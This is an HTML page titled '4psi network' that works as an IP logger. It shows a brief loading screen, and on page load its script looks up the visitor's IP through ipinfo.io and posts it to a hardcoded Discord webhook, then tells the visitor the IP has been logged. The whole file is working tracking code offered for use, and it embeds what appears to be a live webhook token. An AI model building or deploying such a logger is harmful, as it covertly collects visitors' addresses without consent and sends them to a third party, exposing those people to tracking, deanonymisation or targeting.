<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>4psi network</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f4f4f4;
        }

        #loading {
            font-family: Arial, sans-serif;
            font-size: 24px;
            text-align: center;
        }

        #content {
            display: none;
        }
    </style>
</head>
<body>

    <!-- Loading Screen -->
    <div id="loading">Loading, please wait...</div>

    <!-- Hidden content until loaded -->
    <div id="content">
        <h1>Welcome to the IP Logger Page</h1>
        <p>Your IP has been logged.</p>
    </div>

    <script>
        // Show loading for 2 seconds
        setTimeout(function() {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('content').style.display = 'block';
        }, 2000);

        // Function to send IP to webhook
        function logIP(ip) {
            const webhookURL = 'https://discord.com/api/webhooks/1289478019915972661/lPapTutHhJ5MJJgPAnKF5AVWBbXMHhr8YLVll8g-VQzcAGmHuIEfjBYWs4DUCQCYTQ2h';

            // Create the payload to send to the webhook
            const payload = {
                content: `New visitor IP: ${ip}`
            };

            // Send IP to the webhook
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).then(response => {
                console.log('IP logged successfully:', ip);
            }).catch(error => {
                console.error('Error logging IP:', error);
            });
        }

        // Fetch visitor's IP using ipinfo.io and log it
        fetch('https://ipinfo.io/json')
            .then(response => response.json())
            .then(data => {
                const visitorIP = data.ip;
                logIP(visitorIP);
            })
            .catch(error => {
                console.error('Error fetching IP:', error);
            });
    </script>

</body>
</html>
